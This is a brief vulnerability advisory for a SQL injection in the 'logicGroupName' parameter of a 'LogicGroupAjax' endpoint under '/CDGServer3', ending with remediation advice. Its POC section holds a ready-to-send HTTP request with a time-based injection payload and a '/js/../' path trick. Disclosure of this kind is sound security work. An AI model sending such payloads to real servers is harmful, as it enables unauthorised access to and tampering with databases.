


# Vulnerability Report

## Vulnerability Type

SQL Injection

## Vulnerability Description

The `logicGroupName` parameter in the `LogicGroupAjax` interface is not properly validated and sanitized, leading to a SQL injection vulnerability. An attacker can craft a malicious `logicGroupName` parameter to execute arbitrary SQL queries, potentially accessing or modifying sensitive information in the database.


## POC

An attacker can test the vulnerability using the following POC:

```
POST /CDGServer3/js/../LogicGroupAjax HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=isExist&logicGroupName=-1'waitfor delay '0:0:5'--
```

## Impact Scope

This vulnerability may affect all functionalities that use the `LogicGroupAjax` interface and allow user submission of the `logicGroupName` parameter.

## Remediation Suggestions

1. Strictly validate and sanitize the user input for the `logicGroupName` parameter to ensure it contains only legitimate values.
2. Use prepared statements to execute database queries to prevent SQL injection attacks.
3. Conduct regular security audits and code reviews to identify and remediate potential security vulnerabilities.
